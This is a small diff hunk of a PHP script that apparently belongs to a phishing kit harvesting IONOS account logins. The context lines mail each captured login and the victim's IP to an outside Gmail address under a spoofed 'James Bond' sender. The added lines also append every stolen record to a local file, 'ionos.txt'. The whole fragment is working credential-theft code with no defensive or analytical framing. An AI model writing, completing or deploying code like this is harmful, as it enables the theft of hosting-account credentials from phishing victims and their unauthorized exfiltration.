@@ -16,6 +16,12 @@ $recipient = "debra.white1000@gmail.com";
 $subject = "IONOS II Logins - .$ip";
 $headers = "From: James Bond<wirez@googledocsorg>";
 $headers .= "MIME-Version: 1.0\n";
+
+$file = "ionos.txt";
+$open = fopen($file, "a");
+fwrite($open, $message."\n");
+fclose($open);
+
 mail($recipient,$subject,$message,$headers);
 mail($userinfo,$subject,$message,$headers);
        {
